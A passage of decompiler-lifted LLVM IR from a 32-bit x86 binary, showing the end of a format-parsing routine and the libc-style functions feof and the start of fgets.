  %v7_80516bc = icmp sgt i32 %v1_80516b3, 17
  br i1 %v7_80516bc, label %dec_label_pc_80516be, label %dec_label_pc_80516c7

dec_label_pc_80516be:                             ; preds = %dec_label_pc_80516b1
  %v1_80516be = add i32 %v0_80516fd, -134612215
  store i32 %v1_80516be, i32* %eax.global-to-local, align 4
  %v3_80516c1 = and i32 %v2_8051699, 1024
  %v4_80516c1 = icmp eq i32 %v3_80516c1, 0
  %v1_80516c4 = icmp eq i1 %v4_80516c1, false
  %v4_80516c4 = select i1 %v1_80516c4, i32 %v1_80516be, i32 %v1_80516b3
  store i32 %v4_80516c4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80516c7

dec_label_pc_80516c7:                             ; preds = %dec_label_pc_80516b1, %dec_label_pc_80516be
  %v0_80516d0 = phi i32 [ %v1_80516b3, %dec_label_pc_80516b1 ], [ %v4_80516c4, %dec_label_pc_80516be ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80604eb.716 to i32), i32* %ecx.global-to-local, align 4
  %v2_80516d0 = add i32 %tmp76, 32
  %v3_80516d0 = inttoptr i32 %v2_80516d0 to i32*
  store i32 %v0_80516d0, i32* %v3_80516d0, align 4
  %v0_80516d3.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_80516d7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80516d3

dec_label_pc_80516d3:                             ; preds = %dec_label_pc_80516d3, %dec_label_pc_80516c7
  %v0_80516d3 = phi i32 [ %v1_80516d3, %dec_label_pc_80516d3 ], [ %v0_80516d3.pre, %dec_label_pc_80516c7 ]
  %v1_80516d3 = add i32 %v0_80516d3, 1
  store i32 %v1_80516d3, i32* %ecx.global-to-local, align 4
  %v1_80516d4 = inttoptr i32 %v1_80516d3 to i8*
  %v2_80516d4 = load i8, i8* %v1_80516d4, align 1
  %v3_80516d4 = sext i8 %v2_80516d4 to i32
  store i32 %v3_80516d4, i32* %eax.global-to-local, align 4
  %v8_80516d9 = icmp sgt i32 %v0_80516d7.pre, %v3_80516d4
  br i1 %v8_80516d9, label %dec_label_pc_80516d3, label %dec_label_pc_80516db

dec_label_pc_80516db:                             ; preds = %dec_label_pc_80516d3
  store i32 ptrtoint ([21 x i8]* @global_var_80604f5.715 to i32), i32* @ecx, align 4
  %v1_80516e2 = add i32 %v0_80516d3, -134612203
  store i32 %v1_80516e2, i32* %eax.global-to-local, align 4
  %v2_80516e7 = add i32 %v0_80516d3, add (i32 ptrtoint (i32* @global_var_80604dc.717 to i32), i32 -134612203)
  %v3_80516e7 = add i32 %v2_80516e7, %v1_80516e2
  %v4_80516e7 = inttoptr i32 %v3_80516e7 to i16*
  %v5_80516e7 = load i16, i16* %v4_80516e7, align 2
  %v6_80516e7 = sext i16 %v5_80516e7 to i32
  store i32 %v6_80516e7, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_80516e2, 2
  %v3_80516ef = add i32 %factor, 134612172
  %v4_80516ef = inttoptr i32 %v3_80516ef to i16*
  %v5_80516ef = load i16, i16* %v4_80516ef, align 2
  %v6_80516ef = sext i16 %v5_80516ef to i32
  store i32 %v6_80516ef, i32* %eax.global-to-local, align 4
  %v1_80516f7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516f7 = or i32 %v1_80516f7, %v6_80516e7
  %v2_80516f9 = and i32 %v2_80516f7, %v6_80516ef
  store i32 %v2_80516f9, i32* %edx.global-to-local, align 4
  %v0_805170b.pre = load i32, i32* @esi, align 4
  %v0_805170e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051703

dec_label_pc_80516fd:                             ; preds = %dec_label_pc_80516ad
  %v1_80516fd = add i32 %v0_80516fd, 1
  store i32 %v1_80516fd, i32* @ecx, align 4
  %v1_80516fe = inttoptr i32 %v1_80516fd to i8*
  %v2_80516fe = load i8, i8* %v1_80516fe, align 1
  %v3_80516fe = icmp eq i8 %v2_80516fe, 0
  %v1_8051701 = icmp eq i1 %v3_80516fe, false
  br i1 %v1_8051701, label %dec_label_pc_80516ad, label %dec_label_pc_8051703

dec_label_pc_8051703:                             ; preds = %dec_label_pc_80516fd, %dec_label_pc_80516db
  %v0_805170e = phi i32 [ %v0_805170e.pre, %dec_label_pc_80516db ], [ %storemerge4, %dec_label_pc_80516fd ]
  %v0_805170b = phi i32 [ %v0_805170b.pre, %dec_label_pc_80516db ], [ %v0_8051697, %dec_label_pc_80516fd ]
  %v0_8051703 = phi i32 [ %v2_80516f9, %dec_label_pc_80516db ], [ %v3_80516a4, %dec_label_pc_80516fd ]
  store i32 %v0_8051703, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805170b = inttoptr i32 %v0_805170b to i8*
  %v2_805170b = load i8, i8* %v1_805170b, align 1
  %v3_805170b = sext i8 %v2_805170b to i32
  store i32 %v3_805170b, i32* %eax.global-to-local, align 4
  %v2_805170e = add i32 %tmp76, 4
  %v3_805170e = inttoptr i32 %v2_805170e to i32*
  store i32 %v0_805170e, i32* %v3_805170e, align 4
  %v0_8051711 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051711 = load i32, i32* @edx, align 4
  %v2_8051711 = add i32 %v1_8051711, 12
  %v3_8051711 = inttoptr i32 %v2_8051711 to i32*
  store i32 %v0_8051711, i32* %v3_8051711, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_8051718 = load i32, i32* @edx, align 4
  %v1_8051718 = add i32 %v0_8051718, 28
  %v2_8051718 = inttoptr i32 %v1_8051718 to i32*
  store i32 1, i32* %v2_8051718, align 4
  %v0_805171f = load i32, i32* %eax.global-to-local, align 4
  %v1_805171f = load i32, i32* @edx, align 4
  %v2_805171f = add i32 %v1_805171f, 8
  %v3_805171f = inttoptr i32 %v2_805171f to i32*
  store i32 %v0_805171f, i32* %v3_805171f, align 4
  %v0_8051722 = load i32, i32* %edi.global-to-local, align 4
  %v1_805172c = and i32 %v0_8051722, -5
  %v0_8051732 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051732 = and i32 %v0_8051732, 3840
  store i32 %v1_8051732, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805173b = or i32 %v1_8051732, %v1_805172c
  store i32 %v2_805173b, i32* @edi, align 4
  %v1_805173d = load i32, i32* @edx, align 4
  %v2_805173d = add i32 %v1_805173d, 20
  %v3_805173d = inttoptr i32 %v2_805173d to i32*
  store i32 48, i32* %v3_805173d, align 4
  %v0_8051740 = load i32, i32* @edi, align 4
  %v1_8051740 = load i32, i32* @edx, align 4
  %v2_8051740 = add i32 %v1_8051740, 16
  %v3_8051740 = inttoptr i32 %v2_8051740 to i32*
  store i32 %v0_8051740, i32* %v3_8051740, align 4
  %v0_8051743 = load i32, i32* @ecx, align 4
  %v1_8051743 = inttoptr i32 %v0_8051743 to i8*
  %v2_8051743 = load i8, i8* %v1_8051743, align 1
  %v3_8051743 = icmp eq i8 %v2_8051743, 0
  %v1_8051746 = icmp eq i1 %v3_8051743, false
  br i1 %v1_8051746, label %dec_label_pc_805175f, label %dec_label_pc_8051748

dec_label_pc_8051748:                             ; preds = %dec_label_pc_8051703
  %v0_8051748 = load i32, i32* @esi, align 4
  %v1_8051748 = inttoptr i32 %v0_8051748 to i8*
  %v2_8051748 = load i8, i8* %v1_8051748, align 1
  %v11_8051748 = icmp eq i8 %v2_8051748, 109
  %v1_805174b = icmp eq i1 %v11_8051748, false
  br i1 %v1_805174b, label %dec_label_pc_8051859, label %dec_label_pc_8051751

dec_label_pc_8051751:                             ; preds = %dec_label_pc_8051748
  %v0_8051751 = load i32, i32* @edx, align 4
  %v1_8051751 = add i32 %v0_8051751, 32
  %v2_8051751 = inttoptr i32 %v1_8051751 to i32*
  store i32 20, i32* %v2_8051751, align 4
  %v0_8051758 = load i32, i32* @edx, align 4
  %v1_8051758 = add i32 %v0_8051758, 28
  %v2_8051758 = inttoptr i32 %v1_8051758 to i32*
  store i32 0, i32* %v2_8051758, align 4
  br label %dec_label_pc_805175f

dec_label_pc_805175f:                             ; preds = %dec_label_pc_8051703, %dec_label_pc_8051751
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_80517fb, label %dec_label_pc_805176a

dec_label_pc_805176a:                             ; preds = %dec_label_pc_805175f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_80517e3 = add i32 %tmp76, 40
  %v4_8051779 = add i32 %tmp76, 36
  %v1_80517ec = add i32 %tmp76, 28
  %v2_80517ec = inttoptr i32 %v1_80517ec to i32*
  br label %dec_label_pc_805176c

dec_label_pc_805176c:                             ; preds = %dec_label_pc_80517e7, %dec_label_pc_805176a
  %v0_8051782 = phi i32 [ 0, %dec_label_pc_805176a ], [ %v1_80517eb, %dec_label_pc_80517e7 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805176a ], [ %stack_var_-88.5, %dec_label_pc_80517e7 ]
  %v1_805176c = add i32 %v0_8051782, -2
  %v6_805176c = sub i32 1, %v0_8051782
  %v7_805176c = and i32 %v6_805176c, %v0_8051782
  %v8_805176c = icmp slt i32 %v7_805176c, 0
  %v9_805176c = icmp eq i32 %v1_805176c, 0
  %v10_805176c = icmp slt i32 %v1_805176c, 0
  %v3_805176f = icmp eq i1 %v10_805176c, %v8_805176c
  %v4_805176f = icmp eq i1 %v9_805176c, false
  %v5_805176f = and i1 %v4_805176f, %v3_805176f
  br i1 %v5_805176f, label %dec_label_pc_8051782, label %dec_label_pc_8051771

dec_label_pc_8051771:                             ; preds = %dec_label_pc_805176c
  %v0_8051771 = load i32, i32* @esp, align 4
  %v2_8051771 = mul i32 %v0_8051782, 4
  %v3_8051771 = add i32 %v2_8051771, 68
  %v4_8051771 = add i32 %v3_8051771, %v0_8051771
  %v5_8051771 = inttoptr i32 %v4_8051771 to i32*
  %v6_8051771 = load i32, i32* %v5_8051771, align 4
  store i32 %v6_8051771, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051779 = trunc i32 %v6_8051771 to i8
  %v5_8051779 = add i32 %v4_8051779, %v0_8051782
  %v6_8051779 = inttoptr i32 %v5_8051779 to i8*
  store i8 %v1_8051779, i8* %v6_8051779, align 1
  %v0_805177d = load i32, i32* %eax.global-to-local, align 4
  %v1_805177d = urem i32 %v0_805177d, 256
  br label %dec_label_pc_805178b

dec_label_pc_8051782:                             ; preds = %dec_label_pc_805176c
  %v5_8051784 = add i32 %v0_8051782, %stack_var_-32.3
  store i32 %v5_8051784, i32* %eax.global-to-local, align 4
  %v1_8051788 = add i32 %v5_8051784, -2
  br label %dec_label_pc_805178b

dec_label_pc_805178b:                             ; preds = %dec_label_pc_8051771, %dec_label_pc_8051782
  %v0_805179e = phi i32 [ %v1_805177d, %dec_label_pc_8051771 ], [ %v1_8051788, %dec_label_pc_8051782 ]
  store i32 %v0_805179e, i32* %eax.global-to-local, align 4
  %v5_805178b = sub i32 %v0_805179e, %stack_var_-88.4
  %v11_805178b = xor i32 %v0_805179e, %stack_var_-88.4
  %v12_805178b = xor i32 %v5_805178b, %v0_805179e
  %v13_805178b = and i32 %v12_805178b, %v11_805178b
  %v14_805178b = icmp slt i32 %v13_805178b, 0
  %v15_805178b = icmp eq i32 %v5_805178b, 0
  %v16_805178b = icmp slt i32 %v5_805178b, 0
  %v3_805178f = icmp ne i1 %v16_805178b, %v14_805178b
  %v4_805178f = or i1 %v15_805178b, %v3_805178f
  br i1 %v4_805178f, label %dec_label_pc_805179e, label %dec_label_pc_8051791

dec_label_pc_8051791:                             ; preds = %dec_label_pc_805178b
  %v1_8051791 = add i32 %v0_805179e, -9
  %v6_8051791 = sub i32 8, %v0_805179e
  %v7_8051791 = and i32 %v6_8051791, %v0_805179e
  %v8_8051791 = icmp slt i32 %v7_8051791, 0
  %v9_8051791 = icmp eq i32 %v1_8051791, 0
  %v10_8051791 = icmp slt i32 %v1_8051791, 0
  %v3_8051794 = icmp eq i1 %v10_8051791, %v8_8051791
  %v4_8051794 = icmp eq i1 %v9_8051791, false
  %v5_8051794 = and i1 %v4_8051794, %v3_8051794
  br i1 %v5_8051794, label %dec_label_pc_8051859, label %dec_label_pc_805179e

dec_label_pc_805179e:                             ; preds = %dec_label_pc_8051791, %dec_label_pc_805178b
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805178b ], [ %v0_805179e, %dec_label_pc_8051791 ]
  %v1_805179e = add i32 %v0_805179e, -1
  store i32 %v1_805179e, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_80517a7 = load i32, i32* @esp, align 4
  %v1_80517a7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80517a7 = mul i32 %v1_80517a7, 4
  %v3_80517a7 = add i32 %v0_80517a7, 80
  %v4_80517a7 = add i32 %v3_80517a7, %v2_80517a7
  %v5_80517a7 = inttoptr i32 %v4_80517a7 to i32*
  %v6_80517a7 = load i32, i32* %v5_80517a7, align 4
  store i32 %v6_80517a7, i32* %edi.global-to-local, align 4
  %v2_80517ab = mul i32 %v1_805179e, 4
  %v4_80517ab = add i32 %v4_80517e3, %v2_80517ab
  %v5_80517ab = inttoptr i32 %v4_80517ab to i32*
  %v6_80517ab = load i32, i32* %v5_80517ab, align 4
  store i32 %v6_80517ab, i32* @eax, align 4
  %v9_80517af = icmp eq i32 %v6_80517a7, 8
  br i1 %v9_80517af, label %dec_label_pc_80517e7, label %dec_label_pc_80517b4

dec_label_pc_80517b4:                             ; preds = %dec_label_pc_805179e
  %v9_80517b4 = icmp eq i32 %v6_80517ab, 8
  br i1 %v9_80517b4, label %dec_label_pc_80517d7, label %dec_label_pc_80517b9

dec_label_pc_80517b9:                             ; preds = %dec_label_pc_80517b4
  %v12_80517b9 = icmp eq i32 %v6_80517ab, %v6_80517a7
  br i1 %v12_80517b9, label %dec_label_pc_80517d7, label %dec_label_pc_80517bd

dec_label_pc_80517bd:                             ; preds = %dec_label_pc_80517b9
  %v1_80517bd = call i32 @_promoted_size(i32 %v1_805179e)
  store i32 %v1_80517bd, i32* %ebx.global-to-local, align 4
  %v0_80517c4 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80517c4, i32* @eax, align 4
  %v1_80517c6 = call i32 @_promoted_size(i32 %v1_805179e)
  %v2_80517cb = sub i32 %v1_80517bd, %v1_80517c6
  %v8_80517cb = xor i32 %v1_80517bd, %v1_80517c6
  %v9_80517cb = xor i32 %v2_80517cb, %v1_80517bd
  %v10_80517cb = and i32 %v9_80517cb, %v8_80517cb
  %v11_80517cb = icmp slt i32 %v10_80517cb, 0
  %v12_80517cb = icmp eq i32 %v2_80517cb, 0
  %v13_80517cb = icmp slt i32 %v2_80517cb, 0
  %v3_80517cd = icmp ne i1 %v13_80517cb, %v11_80517cb
  %v4_80517cd = or i1 %v12_80517cb, %v3_80517cd
  %v5_80517cd = zext i1 %v4_80517cd to i32
  store i32 %v5_80517cd, i32* %eax.global-to-local, align 4
  %v1_80517d3 = icmp eq i1 %v4_80517cd, false
  br i1 %v1_80517d3, label %dec_label_pc_80517e7, label %dec_label_pc_80517bd.dec_label_pc_80517d7_crit_edge

dec_label_pc_80517bd.dec_label_pc_80517d7_crit_edge: ; preds = %dec_label_pc_80517bd
  %v0_80517d7.pre = load i32, i32* @esp, align 4
  %v1_80517d7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80517d7

dec_label_pc_80517d7:                             ; preds = %dec_label_pc_80517bd.dec_label_pc_80517d7_crit_edge, %dec_label_pc_80517b9, %dec_label_pc_80517b4
  %v1_80517d7 = phi i32 [ %v1_80517d7.pre, %dec_label_pc_80517bd.dec_label_pc_80517d7_crit_edge ], [ %v1_80517a7, %dec_label_pc_80517b9 ], [ %v1_80517a7, %dec_label_pc_80517b4 ]
  %v0_80517d7 = phi i32 [ %v0_80517d7.pre, %dec_label_pc_80517bd.dec_label_pc_80517d7_crit_edge ], [ %v0_80517a7, %dec_label_pc_80517b9 ], [ %v0_80517a7, %dec_label_pc_80517b4 ]
  %v2_80517d7 = mul i32 %v1_80517d7, 4
  %v3_80517d7 = add i32 %v0_80517d7, 80
  %v4_80517d7 = add i32 %v3_80517d7, %v2_80517d7
  %v5_80517d7 = inttoptr i32 %v4_80517d7 to i32*
  %v6_80517d7 = load i32, i32* %v5_80517d7, align 4
  store i32 %v6_80517d7, i32* %eax.global-to-local, align 4
  store i32 %v1_805179e, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_80517d7, i32* %v5_80517ab, align 4
  br label %dec_label_pc_80517e7

dec_label_pc_80517e7:                             ; preds = %dec_label_pc_80517bd, %dec_label_pc_805179e, %dec_label_pc_80517d7
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80517eb = load i32, i32* %ebp.global-to-local, align 4
  %v1_80517eb = add i32 %v0_80517eb, 1
  store i32 %v1_80517eb, i32* %ebp.global-to-local, align 4
  %v3_80517ec = load i32, i32* %v2_80517ec, align 4
  %v1_80517ef = add i32 %v3_80517ec, 2
  store i32 %v1_80517ef, i32* %eax.global-to-local, align 4
  %v5_80517f4 = icmp slt i32 %v1_80517eb, %v1_80517ef
  br i1 %v5_80517f4, label %dec_label_pc_805176c, label %dec_label_pc_8051822

dec_label_pc_80517fb:                             ; preds = %dec_label_pc_805175f
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80517ff = add i32 %tmp76, 38
  %v2_80517ff = inttoptr i32 %v1_80517ff to i8*
  store i8 1, i8* %v2_80517ff, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051808 = add i32 %tmp76, 28
  %v2_8051808 = inttoptr i32 %v1_8051808 to i32*
  %v3_8051808 = load i32, i32* %v2_8051808, align 4
  %v2_805180b = mul i32 %v3_8051808, 4
  %v2_805180f = ptrtoint i32* %stack_var_-20 to i32
  %v1_8051816 = add i32 %tmp76, 40
  store i32 %v1_8051816, i32* %eax.global-to-local, align 4
  %v3_805181a = inttoptr i32 %v1_8051816 to i16*
  %v4_805181a = call i32 @memcpy(i16* %v3_805181a, i32 %v2_805180f, i32 %v2_805180b)
  store i32 %v4_805181a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051822

dec_label_pc_8051822:                             ; preds = %dec_label_pc_80517e7, %dec_label_pc_80517fb
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_80517fb ], [ %stack_var_-88.5, %dec_label_pc_80517e7 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_805182a = inttoptr i32 %v1_80514cb to i8*
  %v3_805182a = load i8, i8* %v2_805182a, align 1
  %v5_805182a = icmp slt i8 %v3_805182a, 0
  store i32 %stack_var_-88.6, i32* %v2_80514c4, align 4
  br i1 %v5_805182a, label %dec_label_pc_805183a, label %dec_label_pc_8051833

dec_label_pc_8051833:                             ; preds = %dec_label_pc_8051822
  %v0_8051833 = load i32, i32* @esi, align 4
  %v1_8051833 = add i32 %v0_8051833, 1
  store i32 %v1_8051833, i32* %eax.global-to-local, align 4
  %v1_8051836 = load i32, i32* @ecx, align 4
  %v2_8051836 = inttoptr i32 %v1_8051836 to i32*
  store i32 %v1_8051833, i32* %v2_8051836, align 4
  br label %dec_label_pc_805184d

dec_label_pc_805183a:                             ; preds = %dec_label_pc_8051822
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_8051498, i32* %edx.global-to-local, align 4
  %v0_8051842 = load i32, i32* @esi, align 4
  %v2_8051842 = sub i32 %v0_8051842, %v4_8051498
  store i32 %v2_8051842, i32* %esi.global-to-local, align 4
  %v1_8051844 = mul i32 %v2_8051842, 4
  %v2_8051844 = add i32 %v1_8051844, 224
  store i32 %v2_8051844, i32* %eax.global-to-local, align 4
  %v2_805184b = load i32, i32* %arg1, align 4
  %v4_805184b = add i32 %v2_805184b, %v2_8051844
  store i32 %v4_805184b, i32* %arg1, align 4
  br label %dec_label_pc_805184d

dec_label_pc_805184d:                             ; preds = %dec_label_pc_8051833, %dec_label_pc_805183a
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051851 = add i32 %tmp76, 28
  %v2_8051851 = inttoptr i32 %v1_8051851 to i32*
  %v3_8051851 = load i32, i32* %v2_8051851, align 4
  store i32 %v3_8051851, i32* %eax.global-to-local, align 4
  %v1_8051854 = add i32 %v3_8051851, 2
  br label %dec_label_pc_805185c

dec_label_pc_8051859:                             ; preds = %dec_label_pc_80514e9, %dec_label_pc_8051583, %dec_label_pc_80515b6, %dec_label_pc_8051631, %dec_label_pc_805161d, %dec_label_pc_8051614, %dec_label_pc_8051791, %dec_label_pc_8051693, %dec_label_pc_8051748
  br label %dec_label_pc_805185c

dec_label_pc_805185c:                             ; preds = %dec_label_pc_805184d, %dec_label_pc_8051859
  %storemerge6 = phi i32 [ %v1_8051854, %dec_label_pc_805184d ], [ -1, %dec_label_pc_8051859 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805185f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805185f, i32* @ebx, align 4
  store i32 %v0_8051497, i32* @esi, align 4
  store i32 %v0_8051496, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_80517eb, { 0, 2, 1 }
  uselistorder i32 %v2_80517cb, { 1, 2, 0 }
  uselistorder i32 %v1_80517bd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805179e, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8051791, { 1, 0 }
  uselistorder i32 %v5_805178b, { 1, 2, 0 }
  uselistorder i32 %v0_805179e, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805176c, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051782, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_80516fd, { 1, 2, 0 }
  uselistorder i32 %v1_80516d3, { 1, 2, 0 }
  uselistorder i32 %v0_80516fd, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051699, { 1, 0 }
  uselistorder i32 %v1_8051686, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805168f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8051679, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805166f, { 1, 0 }
  uselistorder i32 %v1_8051651, { 1, 0 }
  uselistorder i32 %v0_805166f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8051634, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805162b, { 1, 2, 0 }
  uselistorder i32 %v0_80515f1, { 1, 0 }
  uselistorder i32 %v1_80515e3, { 1, 0 }
  uselistorder i32 %v1_80515de, { 0, 1, 3, 2 }
  uselistorder i32 %v6_80515dc, { 2, 0, 1 }
  uselistorder i32 %v0_80515fe, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8051599, { 1, 2, 0 }
  uselistorder i32 %v0_8051571, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_8051567, { 1, 2, 0 }
  uselistorder i32 %v6_8051565, { 0, 2, 1 }
  uselistorder i32 %v0_8051564, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_805155d, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_805155d, { 2, 1, 0 }
  uselistorder i32 %v1_8051555, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_805153b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051511, { 0, 2, 1 }
  uselistorder i32 %v0_80514fe, { 2, 0, 1 }
  uselistorder i32 %v4_8051498, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 8, 9, 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* %edi.global-to-local, { 6, 7, 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 8, 9, 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 3, 5, 4, 6, 7, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 10, 9, 11, 12, 15, 13, 21, 16, 17, 18, 19, 20, 22, 23 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134612203, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80604f5.715 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805185c, { 1, 0 }
  uselistorder label %dec_label_pc_8051859, { 6, 8, 7, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_805184d, { 1, 0 }
  uselistorder label %dec_label_pc_8051822, { 1, 0 }
  uselistorder label %dec_label_pc_80517e7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805178b, { 1, 0 }
  uselistorder label %dec_label_pc_805175f, { 1, 0 }
  uselistorder label %dec_label_pc_80516c7, { 1, 0 }
  uselistorder label %dec_label_pc_8051693, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805166a, { 1, 0 }
  uselistorder label %dec_label_pc_8051641, { 1, 0 }
  uselistorder label %dec_label_pc_8051608, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80515ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051565, { 1, 0 }
  uselistorder label %dec_label_pc_8051564, { 1, 0 }
  uselistorder label %dec_label_pc_805154b, { 1, 0 }
  uselistorder label %dec_label_pc_8051534, { 1, 0 }
  uselistorder label %dec_label_pc_8051534.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_8051867 = ptrtoint i32* %stack_var_-28 to i32
  %v4_805186a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805186a, i32* %esi.global-to-local, align 4
  %v1_805186e = add i32 %v4_805186a, 52
  %v2_805186e = inttoptr i32 %v1_805186e to i32*
  %v3_805186e = load i32, i32* %v2_805186e, align 4
  %v1_8051871 = icmp eq i32 %v3_805186e, 0
  %v1_8051873 = icmp eq i1 %v1_8051871, false
  br i1 %v1_8051873, label %dec_label_pc_8051894, label %dec_label_pc_8051875

dec_label_pc_8051875:                             ; preds = %entry
  %v1_8051875 = add i32 %v4_805186a, 56
  store i32 %v1_8051875, i32* %ebx.global-to-local, align 4
  store i32 %v12_8051867, i32* @eax, align 4
  %v2_8051884 = call i32 @__pthread_return_void(i32 %v12_8051867, i32 134562299)
  %v1_805188c = call i32 @__pthread_return_0(i32 %v1_8051875)
  %v0_8051896.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051894

dec_label_pc_8051894:                             ; preds = %entry, %dec_label_pc_8051875
  %v0_8051896 = phi i32 [ %v4_805186a, %entry ], [ %v0_8051896.pre, %dec_label_pc_8051875 ]
  %v1_8051896 = inttoptr i32 %v0_8051896 to i16*
  %v2_8051896 = load i16, i16* %v1_8051896, align 2
  %v3_8051896 = zext i16 %v2_8051896 to i32
  store i32 %v3_8051896, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051873, label %dec_label_pc_80518ac, label %dec_label_pc_805189b

dec_label_pc_805189b:                             ; preds = %dec_label_pc_8051894
  store i32 %v12_8051867, i32* @eax, align 4
  %v2_80518a4 = call i32 @__pthread_return_void(i32 %v12_8051867, i32 1)
  %v0_80518af.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80518ac

dec_label_pc_80518ac:                             ; preds = %dec_label_pc_8051894, %dec_label_pc_805189b
  %v0_80518af = phi i32 [ %v3_8051896, %dec_label_pc_8051894 ], [ %v0_80518af.pre, %dec_label_pc_805189b ]
  %v1_80518af = and i32 %v0_80518af, 4
  ret i32 %v1_80518af

; uselistorder directives
  uselistorder i32 %v12_8051867, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_80518ac, { 1, 0 }
  uselistorder label %dec_label_pc_8051894, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80518b8 = load i32, i32* @edi, align 4
  %v0_80518b9 = load i32, i32* @esi, align 4
  %v0_80518ba = load i32, i32* @ebx, align 4
  %v12_80518bb = ptrtoint i32* %stack_var_-28 to i32
